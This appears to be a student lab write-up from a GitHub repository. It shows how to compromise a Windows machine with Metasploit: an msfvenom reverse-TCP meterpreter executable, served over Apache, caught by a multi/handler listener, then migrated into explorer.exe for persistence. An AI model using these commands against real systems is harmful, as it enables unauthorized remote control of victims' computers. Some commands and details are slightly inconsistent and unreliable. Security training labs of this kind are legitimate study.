# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="734" height="349" alt="image" src="https://github.com/user-attachments/assets/8d5b9043-3e8e-4776-ab0e-54c58b390923" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="857" height="143" alt="image" src="https://github.com/user-attachments/assets/6cd7a802-de6c-44ed-a347-7f24a221561d" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="445" height="48" alt="image" src="https://github.com/user-attachments/assets/d9e37478-6897-4866-b081-36d4b0e03bde" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="542" height="51" alt="image" src="https://github.com/user-attachments/assets/23d267ea-5bb3-4043-a1bb-5c24b9b64167" />


Check the status of apache2
## OUTPUT:
<img width="713" height="515" alt="image" src="https://github.com/user-attachments/assets/ab58e17f-c438-422b-9f29-b035c37532a5" />



Invoke msfconsole:
## OUTPUT:
<img width="667" height="708" alt="image" src="https://github.com/user-attachments/assets/4a5b66fe-b6fb-4e63-9cab-17c7944aca12" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="829" height="827" alt="image" src="https://github.com/user-attachments/assets/4c3e0fdc-a679-4ad5-b27d-ace553b20816" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="650" height="132" alt="image" src="https://github.com/user-attachments/assets/69836bd7-f5e1-42c2-8d1f-948e927e7cc3" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="939" height="245" alt="image" src="https://github.com/user-attachments/assets/a363c08b-3253-4608-9563-03071205ade9" />
<img width="779" height="153" alt="image" src="https://github.com/user-attachments/assets/2baae00a-2cfe-4b92-bb09-ee8d626c2761" />

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
